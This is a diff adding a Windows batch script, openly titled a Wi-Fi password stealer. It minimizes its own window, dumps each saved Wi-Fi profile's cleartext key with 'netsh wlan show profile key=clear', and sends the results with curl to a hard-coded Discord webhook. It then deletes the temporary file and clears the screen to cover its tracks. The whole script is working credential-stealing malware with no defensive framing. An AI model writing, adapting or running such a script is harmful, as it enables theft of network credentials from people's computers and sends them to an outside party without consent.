@@ -1,0 +1,71 @@
+@echo off
+setlocal enabledelayedexpansion
+
+:: Banner display
+echo ================================================
+echo           W i F i - P a S S w O r D - S t E a L E r
+echo ================================================
+echo.
+
+:: Minimize the CMD window
+if not "!minimized!"=="true" (
+    set "minimized=true"
+    start /min cmd /c "%~dpnx0"
+    exit /b
+)
+
+:: Set the Discord Webhook URL
+set WEBHOOK_URL=https://discord.com/api/webhooks/1316747936650100736/f6eOuxMkZ7l_N_GzyAeMsqwvDyhx8OBlDiwXyW9Yce3GqQ6l2PKq_YIoL_isu67jW3U8
+
+:: Get OS name and create output file name
+for /f "tokens=2 delims=:" %%i in ('systeminfo ^| findstr /b /c:"OS Name"') do set "osName=%%i"
+set "osName=%osName: =_%"
+set outputPath=%TEMP%\%osName%.txt
+
+:: Define custom file location to store the results
+set customFilePath=C:\path\to\your\desired\folder\wifi_passwords.txt
+
+:: Collect Wi-Fi passwords and save to file
+echo --- Wi-Fi Passwords --- > "%outputPath%"
+echo --- Wi-Fi Passwords --- > "%customFilePath%"
+for /f "tokens=2 delims=:" %%i in ('netsh wlan show profiles ^| findstr "All User Profile"') do (
+    set "profile=%%i"
+    call :GetPassword
+)
+
+:: Send the file to the Discord webhook using curl
+curl -X POST %WEBHOOK_URL% ^ 
+     -H "Content-Type: multipart/form-data" ^ 
+     -F "file=@%outputPath%;filename=%osName%.txt" >nul 2>&1
+
+:: Also save the results in the custom file path
+copy "%outputPath%" "%customFilePath%" >nul
+
+:: Clean up and exit
+del "%outputPath%"
+cls
+exit /b
+
+:GetPassword
+:: Trim leading spaces
+set profile=%profile:~1%
+echo Profile: %profile% >> "%outputPath%"
+echo Profile: %profile% >> "%customFilePath%"
+
+:: Retrieve the password for the profile
+for /f "tokens=2 delims=:" %%j in ('netsh wlan show profile name^="%profile%" key^=clear ^| findstr "Key Content"') do (
+    set "password=%%j"
+)
+
+:: Trim leading spaces and save
+if defined password (
+    set password=%password:~1%
+    echo Password: %password% >> "%outputPath%"
+    echo Password: %password% >> "%customFilePath%"
+) else (
+    echo Password: [No password stored or profile inaccessible] >> "%outputPath%"
+    echo Password: [No password stored or profile inaccessible] >> "%customFilePath%"
+)
+echo --------------------------------------------------- >> "%outputPath%"
+echo --------------------------------------------------- >> "%customFilePath%"
+exit /b
